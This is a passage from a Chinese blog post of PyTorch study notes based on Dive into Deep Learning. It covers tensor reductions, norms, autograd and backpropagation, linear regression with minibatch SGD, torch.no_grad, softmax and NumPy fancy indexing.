flat"><p><code>.clone()</code>是深拷贝，开辟新的存储地址而不是引用来保存旧的tensor，在梯度回传的时候clone()充当中间变量，会将梯度传给源张量进行叠加，但是本身不保存其grad，值为None。<br><code>.detach()</code>是浅拷贝，新的tensor会脱离计算图，<strong>不会牵扯梯度计算</strong>。</p><p><img src="/posts/901c6f233b3c/image-20230729210152135.png" class="" title="image-20230729210152135"></p></div><h3 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h3><h4 id="降维"><a href="#降维" class="headerlink" title="降维"></a>降维</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = torch.arange(<span class="number">20</span>, dtype=torch.float32).reshape(<span class="number">5</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>默认情况下，调用求和函数会沿所有的轴降低张量的维度，使它变为一个标量。 我们还可以[<strong>指定张量沿哪一个轴来通过求和降低维度</strong>]。 以矩阵为例，为了通过求和所有行的元素来降维（轴0），可以在调用函数时指定<code>axis=0</code>。 由于输入矩阵沿0轴降维以生成输出向量，因此输入轴0的维数在输出形状中消失。</p><p>In :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A_sum_axis0 = A.<span class="built_in">sum</span>(axis=<span class="number">0</span>)</span><br><span class="line">A_sum_axis0, A_sum_axis0.shape</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(tensor([<span class="number">40.</span>, <span class="number">45.</span>, <span class="number">50.</span>, <span class="number">55.</span>]), torch.Size([<span class="number">4</span>]))</span><br></pre></td></tr></table></figure><p>指定<code>axis=1</code>将通过汇总所有列的元素降维（轴1）。因此，输入轴1的维数在输出形状中消失。</p><p>In :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A_sum_axis1 = A.<span class="built_in">sum</span>(axis=<span class="number">1</span>)</span><br><span class="line">A_sum_axis1, A_sum_axis1.shape</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(tensor([ <span class="number">6.</span>, <span class="number">22.</span>, <span class="number">38.</span>, <span class="number">54.</span>, <span class="number">70.</span>]), torch.Size([<span class="number">5</span>]))</span><br></pre></td></tr></table></figure><p>沿着行和列对矩阵求和，等价于对矩阵的所有元素进行求和。</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.<span class="built_in">sum</span>(axis=[<span class="number">0</span>, <span class="number">1</span>])  <span class="comment"># 结果和A.sum()相同</span></span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tensor(<span class="number">190.</span>)</span><br></pre></td></tr></table></figure><h4 id="非降维求和"><a href="#非降维求和" class="headerlink" title="非降维求和"></a>非降维求和</h4><p>但是，有时在调用函数来[<strong>计算总和或均值时保持轴数不变</strong>]会很有用。</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sum_A = A.<span class="built_in">sum</span>(axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>)</span><br><span class="line">sum_A</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[ <span class="number">6.</span>],</span><br><span class="line">        [<span class="number">22.</span>],</span><br><span class="line">        [<span class="number">38.</span>],</span><br><span class="line">        [<span class="number">54.</span>],</span><br><span class="line">        [<span class="number">70.</span>]])</span><br></pre></td></tr></table></figure><p>例如，由于<code>sum_A</code>在对每行进行求和后仍保持两个轴，我们可以(<strong>通过广播将<code>A</code>除以<code>sum_A</code></strong>)。</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A / sum_A</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[<span class="number">0.0000</span>, <span class="number">0.1667</span>, <span class="number">0.3333</span>, <span class="number">0.5000</span>],</span><br><span class="line">        [<span class="number">0.1818</span>, <span class="number">0.2273</span>, <span class="number">0.2727</span>, <span class="number">0.3182</span>],</span><br><span class="line">        [<span class="number">0.2105</span>, <span class="number">0.2368</span>, <span class="number">0.2632</span>, <span class="number">0.2895</span>],</span><br><span class="line">        [<span class="number">0.2222</span>, <span class="number">0.2407</span>, <span class="number">0.2593</span>, <span class="number">0.2778</span>],</span><br><span class="line">        [<span class="number">0.2286</span>, <span class="number">0.2429</span>, <span class="number">0.2571</span>, <span class="number">0.2714</span>]])</span><br></pre></td></tr></table></figure><p>如果我们想沿[<strong>某个轴计算<code>A</code>元素的累积总和</strong>]， 比如<code>axis=0</code>（按行计算），可以调用<code>cumsum</code>函数。 此函数不会沿任何轴降低输入张量的维度。</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.cumsum(axis=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[ <span class="number">0.</span>,  <span class="number">1.</span>,  <span class="number">2.</span>,  <span class="number">3.</span>],</span><br><span class="line">        [ <span class="number">4.</span>,  <span class="number">6.</span>,  <span class="number">8.</span>, <span class="number">10.</span>],</span><br><span class="line">        [<span class="number">12.</span>, <span class="number">15.</span>, <span class="number">18.</span>, <span class="number">21.</span>],</span><br><span class="line">        [<span class="number">24.</span>, <span class="number">28.</span>, <span class="number">32.</span>, <span class="number">36.</span>],</span><br><span class="line">        [<span class="number">40.</span>, <span class="number">45.</span>, <span class="number">50.</span>, <span class="number">55.</span>]])</span><br></pre></td></tr></table></figure><h4 id="范数"><a href="#范数" class="headerlink" title="范数"></a>范数</h4><p>类似于向量的$L_2$范数，[<strong>矩阵</strong>]$\mathbf{X} \in \mathbb{R}^{m \times n}$(<strong>的<em>Frobenius范数</em>（Frobenius norm）是矩阵元素平方和的平方根：</strong></p><p>$|\mathbf{X}|<em>F = \sqrt{\sum</em>{i=1}^m \sum<em>{j=1}^n x</em>{ij}^2}.$</p><p>Frobenius范数满足向量范数的所有性质，它就像是矩阵形向量的$L_2$范数。 调用以下函数将计算矩阵的Frobenius范数。</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.norm(torch.ones((<span class="number">4</span>, <span class="number">9</span>)))</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tensor(<span class="number">6.</span>)</span><br></pre></td></tr></table></figure><h3 id="自动求导、反向传播、梯度下降（重点）"><a href="#自动求导、反向传播、梯度下降（重点）" class="headerlink" title="自动求导、反向传播、梯度下降（重点）"></a>自动求导、反向传播、梯度下降（重点）</h3><p>这里其实是理解深度学习时<strong>最关键</strong>的一个知识点，基本上如果能将这一部分搞清楚，那么之后自己训练模型的时候也能更胸有成竹一些，而不是仅仅成为一个“调参小子”（仿照“脚本小子”的叫法🤣</p><div class="note info flat"><p><strong>脚本小子</strong>（英语：<strong>script kiddie</strong>）是一个贬义词，用来描述以“<a href="https://zh.wikipedia.org/wiki/黑客">黑客</a>”自居并沾沾自喜的初学者。脚本小子不像真正的黑客那样发现系统漏洞，他们通常使用别人开发的程序来恶意破坏他人系统。通常的刻板印象为一位没有专科经验的少年，破坏无辜网站企图使得他的朋友感到惊讶，因而称之为脚本小子。</p><p>脚本小子常常从某些网站上复制脚本代码，然后到处粘贴，却并不一定明白它们的方法与原理。他们钦慕于黑客的能力与探索精神，但与黑客所不同的是，脚本小子通常只是对计算机系统有基础了解与爱好，但并不注重<a href="https://zh.wikipedia.org/wiki/程序語言">程序语言</a>、<a href="https://zh.wikipedia.org/wiki/算法">算法</a>和<a href="https://zh.wikipedia.org/wiki/数据结构">数据结构</a>的研究，虽然这些对于真正的黑客来说是必须具备的素质。</p></div><p>在学习了原书以及一些在线资料之后，我分享一下自己对自动求导、反向传播和梯度下降这几个概念的理解</p><div class="note warning flat"><p><strong>以下内容均为个人理解</strong>，如有纰漏或者有更好的表达请在评论区指出😊</p></div><p>我们都知道，深度学习的最终目标是找到一组最终的参数，使得当前的损失函数(Loss Function)最小</p><p>那么这里其实可以简化为一个求函数最小值的问题，此时网络的中间参数为<strong>自变量</strong>，损失函数的值为<strong>因变量</strong></p><p>其实如果自变量只有一个，那么此时问题就变成了在直角坐标系的曲线上寻找最低点的问题，我们只需要找到x使得导数$\frac{\partial y(x)}{\partial x} = 0$，那么此处的因变量值y就为函数的局部最小值</p><p>由于真实的神经网络结构中中间参数的个数很多，我们需要将自变量推广为一个<strong>向量</strong>，而此时导数则推广为<strong>梯度</strong></p><div class="note info flat"><p><strong>梯度</strong>（gradient）的本意是一个向量（矢量），表示某一函数在该点处的方向导数沿着该方向取得最大值，即函数在该点处沿着该方向（此梯度的方向）变化最快，变化率最大（为该梯度的模）。</p><ul><li><p>当y为标量，x为向量时</p><p><style>.nbyfgmxcsiiu{zoom: 50%;}</style><img src="/posts/901c6f233b3c/image-20230731171519300.png" class="nbyfgmxcsiiu" alt="image-20230731171519300"></p></li><li><p>当y和x均为向量时</p><p><style>.thpfwkxqrpje{zoom: 67%;}</style><img src="/posts/901c6f233b3c/image-20230726212743994.png" class="thpfwkxqrpje" alt="image-20230726212743994"></p></li></ul></div><p>但是很多情况下，并不能直接找到令梯度为0的值，所以只能够逐渐调整中间参数，使得损失函数的值不断减小</p><p>此时就要用到<strong>梯度下降法</strong></p><p>梯度这个概念的名称其实非常直观，我们可以将它<strong>与山脉的坡度类比</strong>⛰</p><p>当我们需要下山到山谷时，如果沿着坡度的反方向走，下山的速度是最快的</p><p>所以当我们每次需要调整中间参数时，可以用它减去学习率乘以梯度向量取反，这里的学习率可以与下山时走路的步长类比</p><p>而<strong>更新参数的具体细节</strong>是如何实现的呢？</p><p>此时需要用到<strong>反向传播算法</strong></p><p>这里的<strong>反向</strong>二字其实就是指损失函数对参数的梯度通过网络反向流动</p><p>而通过利用<strong>链式法则</strong>，可以计算出<strong>损失函数对各参数的梯度</strong>，具体公式这里就不涉及了</p><div class="note info flat"><p><style>.yglhilmscyhm{zoom:67%;}</style><img src="/posts/901c6f233b3c/image-20230726214825560.png" class="yglhilmscyhm" alt="image-20230726214825560"></p></div><p>而该如何<strong>更高效地计算</strong>梯度呢？</p><p>这里涉及到<strong>自动求导</strong>的概念，自动求导是基于<strong>计算图</strong>的</p><div class="note info flat"><p><strong>计算图</strong>被定义为有向图，其中节点对应于数学运算。 计算图是表达和评估数学表达式的一种方式。</p><p>例如，这里有一个简单的数学公式 -</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = x + y</span><br></pre></td></tr></table></figure><p>我们可以绘制上述方程的计算图如下。<br><img src="/posts/901c6f233b3c/738090622_96682.png" class="" title="img"></p><p>上面的计算图具有一个加法节点(具有“+”符号的节点)，其具有两个输入变量<code>x</code>和<code>y</code>以及一个输出<code>q</code>。</p><p>让我们再举一个例子，稍微复杂些。如下等式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g = ( x + y ) ∗ z</span><br></pre></td></tr></table></figure><p>以上等式由以下计算图表示。</p><p><img src="/posts/901c6f233b3c/829090623_54957.png" class="" title="img"></p></div><p>通过一次前向累积和一次反向累积，就能在保证速度的条件下完成自动求导</p><p><style>.mknldnvelymt{zoom: 25%;}</style><img src="/posts/901c6f233b3c/image-20230726221124109.png" class="mknldnvelymt" alt="image-20230726221124109"></p><p><style>.cqlxotjkivlf{zoom: 67%;}</style><img src="/posts/901c6f233b3c/image-20230726221205461.png" class="cqlxotjkivlf" alt="image-20230726221205461"></p><p><style>.qjhkuctjmfem{zoom: 67%;}</style><img src="/posts/901c6f233b3c/image-20230726221225754.png" class="qjhkuctjmfem" alt="image-20230726221225754"></p><p>在<strong>Pytorch</strong>中，这一过程是<strong>隐式</strong>进行的，只需要我们在设定参数时注明以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x.requires_grad_(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>以下是一个如何使用反向传播的示例：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">x = torch.arrange(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">x.requires_grad_(<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#前两个语句可压缩成x = torch.arange(4.0,requires_grad=True)</span></span><br><span class="line">y = <span class="number">2</span> * torch.dot(x,x)</span><br><span class="line">y.backward()</span><br><span class="line">x.grad</span><br><span class="line">x.grad == <span class="number">4</span> * x</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tensor([<span class="number">0.</span>, <span class="number">4.</span>, <span class="number">8.</span>, <span class="number">12.</span>])</span><br><span class="line">tensor([<span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>])</span><br></pre></td></tr></table></figure><div class="note primary flat"><p>如果想要加深对这几个概念的理解，下面这几个视频也讲的还不错</p><p>自动求导：<a href="https://www.bilibili.com/video/BV1yG411x7Cc">https://www.bilibili.com/video/BV1yG411x7Cc</a></p><p>反向传播：<a href="https://www.bilibili.com/video/BV16x411V7Qg">https://www.bilibili.com/video/BV16x411V7Qg</a></p><p>梯度下降：<a href="https://www.bilibili.com/video/BV1Ux411j7ri">https://www.bilibili.com/video/BV1Ux411j7ri</a></p></div><h2 id="Chapter3-线性神经网络"><a href="#Chapter3-线性神经网络" class="headerlink" title="Chapter3.线性神经网络"></a>Chapter3.线性神经网络</h2><h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><h4 id="小批量随机梯度下降"><a href="#小批量随机梯度下降" class="headerlink" title="小批量随机梯度下降"></a>小批量随机梯度下降</h4><p><style>.ryllrkhmrqpt{zoom: 50%;}</style><img src="/posts/901c6f233b3c/image-20230728151859106.png" class="ryllrkhmrqpt" alt="image-20230728151859106"></p><p><style>.ybaezhtxvmum{zoom:67%;}</style><img src="/posts/901c6f233b3c/image-20230728151912015.png" class="ybaezhtxvmum" alt="image-20230728151912015"></p><p>选择批量大小时</p><p><style>.rwphlkrduvod{zoom: 50%;}</style><img src="/posts/901c6f233b3c/image-20230728151942500.png" class="rwphlkrduvod" alt="image-20230728151942500"></p><h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><ul><li><p>优化算法</p><p>小批量随机梯度下降：</p><p>在每一步中，使用从数据集中随机抽取的一个小批量，然后根据参数计算损失的梯度。 接下来，朝着减少损失的方向更新我们的参数。 下面的函数实现小批量随机梯度下降更新。 该函数接受模型参数集合、学习速率和批量大小作为输入。每 一步更新的大小由学习速率<code>lr</code>决定。 因为我们计算的损失是一个批量样本的总和，所以我们用批量大小（<code>batch_size</code>） 来规范化步长，这样步长大小就不会取决于我们对批量大小的选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sgd</span>(<span class="params">params, lr, batch_size</span>):  <span class="comment">#@save</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;小批量随机梯度下降&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">            param -= lr * param.grad / batch_size</span><br><span class="line">            param.grad.zero_()</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>每个batch计算时，需要使用x.grad.zero_()把梯度先清零（此处x为特征参数），若不清零，则</p><p>下次调用x.grad时会在之前梯度数值上累加。</p></div></li><li><p>训练流程：</p><p>执行以下循环：</p><ul><li>初始化参数</li><li>重复以下训练，直到完成<ul><li>计算梯度$\mathbf{g} \leftarrow \partial<em>{(\mathbf{w},b)} \frac{1}{|\mathcal{B}|} \sum</em>{i \in \mathcal{B}} l(\mathbf{x}^{(i)}, y^{(i)}, \mathbf{w}, b)$</li><li>更新参数$(\mathbf{w}, b) \leftarrow (\mathbf{w}, b) - \eta \mathbf{g}$</li></ul></li></ul></li><li><p>具体代码：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lr = <span class="number">0.03</span></span><br><span class="line">num_epochs = <span class="number">3</span></span><br><span class="line">net = linreg</span><br><span class="line">loss = squared_loss</span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> X, y <span class="keyword">in</span> data_iter(batch_size, features, labels):</span><br><span class="line">        l = loss(net(X, w, b), y)  <span class="comment"># X和y的小批量损失</span></span><br><span class="line">        <span class="comment"># 因为l形状是(batch_size,1)，而不是一个标量。l中的所有元素被加到一起，</span></span><br><span class="line">        <span class="comment"># 并以此计算关于[w,b]的梯度</span></span><br><span class="line">        l.<span class="built_in">sum</span>().backward()</span><br><span class="line">        sgd([w, b], lr, batch_size)  <span class="comment"># 使用参数的梯度更新参数</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        train_l = loss(net(features, w, b), labels)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;epoch <span class="subst">&#123;epoch + <span class="number">1</span>&#125;</span>, loss <span class="subst">&#123;<span class="built_in">float</span>(train_l.mean()):f&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">epoch <span class="number">1</span>, loss <span class="number">0.043705</span></span><br><span class="line">epoch <span class="number">2</span>, loss <span class="number">0.000172</span></span><br><span class="line">epoch <span class="number">3</span>, loss <span class="number">0.000047</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="使用with-torch-no-grad-的原因"><a href="#使用with-torch-no-grad-的原因" class="headerlink" title="使用with torch.no_grad():的原因"></a>使用<code>with torch.no_grad():</code>的原因</h4>  <div class="note info flat"><p>有一些任务，可能事先需要设置，事后做清理工作。对于这种场景，Python的<strong>with语句</strong>提供了一种非常方便的处理方式。其中一个很好的例子是文件处理，你需要获取一个文件句柄，从文件中读取数据，然后关闭文件句柄。</p><p>with 语句适用于对资源进行访问的场合，确保不管使用过程中是否发生异常都会执行必要的“清理”操作，释放资源，比如文件使用后自动关闭／线程中锁的自动获取和释放等。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;１.txt&quot;</span>)</span><br><span class="line">data = file.read()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>存在问题如下：<br>（１）文件读取发生异常，但没有进行任何处理；<br>（２）可能忘记关闭文件句柄；</p><p>初步改进：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;fail to open&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    do something</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    do something</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>虽然上面这段代码运行良好，但比较冗长。<br>而使用with的话，能够减少冗长，还能自动处理上下文环境产生的异常。如下面代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;１.txt&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br></pre></td></tr></table></figure><p>总结with工作原理：<br>（１）紧跟with后面的语句被求值后，返回对象的“–enter–()”方法被调用，这个方法的返回值将被赋值给as后面的变量；<br>（２）当with后面的代码块全部被执行完之后，将调用前面返回对象的“–exit–()”方法。</p><p>参考链接：<a href="https://blog.csdn.net/sazass/article/details/116668755">https://blog.csdn.net/sazass/article/details/116668755</a></p></div><p>  了解了python中<strong>with语句</strong>的用法，那么此处的<code>torch.no_grad()</code>就是作为后面代码块的执行条件</p><p>  而<code>torch.no_grad()</code>的作用就是使所有计算得出的tensor的requires_grad都自动设置为False，这样可以大大减少显存或内存占用。</p><p>  现在我们可以找找前面线性回归的过程中有哪些位置用到了<code>torch.no_grad()</code></p><p>  一处是<strong>小批量随机梯度下降</strong>，一处是<strong>计算训练时的中间结果</strong>，由于我们不需要这两个过程中产生的<strong>新tensor</strong>自动求导，所以我们将其放在<code>torch.no_grad()</code>的条件下</p><h4 id="简洁实现"><a href="#简洁实现" class="headerlink" title="简洁实现"></a>简洁实现</h4><ul><li><p>读取数据集使用TensorDataset和DataLoader函数</p></li><li><p>线性回归使用Linear函数</p></li><li><p>损失函数使用MSELoss函数</p></li><li>小批量随机梯度下降使用optim.SGD函数</li></ul><h3 id="softmax回归"><a href="#softmax回归" class="headerlink" title="softmax回归"></a>softmax回归</h3><img src="/posts/901c6f233b3c/image-20230803150213005.png" class="" title="image-20230803150213005"><h4 id="softmax函数"><a href="#softmax函数" class="headerlink" title="softmax函数"></a>softmax函数</h4><p> softmax函数能够将未规范化的预测变换为非负数并且总和为1，同时让模型保持 可导的性质。 为了完成这一目标，我们首先对每个未规范化的预测求幂，这样可以确保输出非负。 为了确保最终输出的概率值总和为1，我们再让每个求幂后的结果除以它们的总和。如下式：</p><p>$\hat{\mathbf{y}} = \mathrm{softmax}(\mathbf{o})\quad \text{其中}\quad \hat{y}_j = \frac{\exp(o_j)}{\sum_k \exp(o_k)}$</p>  <div class="note info flat"><p>exp() 是一个指数函数，用来求 e（底数）的 x 次幂（次方）的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(<span class="number">4</span>) = <span class="number">54.598150</span></span><br></pre></td></tr></table></figure></div><p>这里，对于所有的$𝑗$总有$0 \leq \hat{y}_j \leq 1$。 因此，$\hat{\mathbf{y}}$可以视为一个正确的概率分布。 softmax运算不会改变未规范化的预测$𝐨$之间的大小次序，只会确定分配给每个类别的概率。 因此，在预测过程中，我们仍然可以用下式来选择最有可能的类别。</p><p>$\operatorname<em>{argmax}_j \hat y_j = \operatorname</em>{argmax}_j o_j.$</p><p>尽管softmax是一个非线性函数，但softmax回归的输出仍然由输入特征的仿射变换决定。 因此，softmax回归是一个<em>线性模型</em>（linear model）。</p><h4 id="具体过程-1"><a href="#具体过程-1" class="headerlink" title="具体过程"></a>具体过程</h4><p>训练集数据读取的速度应该要设定得比模型训练的速度要快</p><p><strong>实现softmax函数</strong></p><p>实现softmax函数由三个步骤组成：</p><ol><li>对每个项求幂（使用<code>exp</code>）；</li><li>对每一行求和（小批量中每个样本是一行），得到每个样本的规范化常数；</li><li>将每一行除以其规范化常数，确保结果的和为1。</li></ol><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">softmax</span>(<span class="params">X</span>):</span><br><span class="line">    X_exp = torch.exp(X)</span><br><span class="line">    partition = X_exp.<span class="built_in">sum</span>(<span class="number">1</span>, keepdim=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> X_exp / partition  <span class="comment"># 这里应用了广播机制</span></span><br></pre></td></tr></table></figure><p><strong>定义损失函数</strong></p><p>这里的交叉熵损失函数在定义时用到了<strong>花式索引</strong>的概念</p>  <div class="note info flat"><p><strong>花式索引</strong>（Fancy indexing）是指利用整数数组进行索引，这里的整数数组可以是Numpy数组也可以是Python中列表、元组等可迭代类型。</p><div class="tabs" id="花式索引"><ul class="nav-tabs"><button type="button" class="tab " data-href="花式索引-1">一维数组的花式索引</button><button type="button" class="tab  active" data-href="花式索引-2">二维数组的花式索引</button></ul><div class="tab-contents"><div class="tab-item-content" id="花式索引-1"><p>当使用花式索引访问一维数组时，程序会将花式索引对应的数组或列表的元素作为索引，依次根据各个索引获取对应位置的元素，并将这些元素以数组的形式返回。</p><p>代码示例如下：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">array_1d = np.arange(<span class="number">1</span>, <span class="number">10</span>) </span><br><span class="line"><span class="built_in">print</span>(array_1d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------&quot;</span>)</span><br><span class="line"><span class="comment"># 访问索引为[2,5,8]的元素</span></span><br><span class="line"><span class="built_in">print</span>(array_1d[[<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]])</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line">------------</span><br><span class="line">[<span class="number">3</span> <span class="number">6</span> <span class="number">9</span>]</span><br></pre></td></tr></table></figure></div><div class="tab-item-content active" id="花式索引-2"><p>当使用花式索引访问二维数组时，程序会将花式索引对应的数组或列表的元素作为索引，依次根据各个索引获取对应位置的一行元素，并将这些行元素以数组的形式返回。</p><p>代码示例如下：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">array_2d = np.arange(<span class="number">1</span>, <span class="number">10</span>).reshape((<span class="number">3</span>, <span class="number">3</span>)) </span><br><span class="line"><span class="built_in">print</span>(array_2d)</span><br><span class="line"><span class="comment"># 访问索引为[0,2]的元素</span></span><br><span class="line"><span class="built_in">print</span>(array_2d[[<span class="number">0</span>, <span class="number">2</span>]])</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line"> [<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]]</span><br><span class="line">------------</span><br><span class="line">[[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"> [<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]]</span><br></pre></td></tr></table></figure><p>需要说明的是，在使用两个花式索引，即通过“二维数组 [ 花式索引 , 花式索引 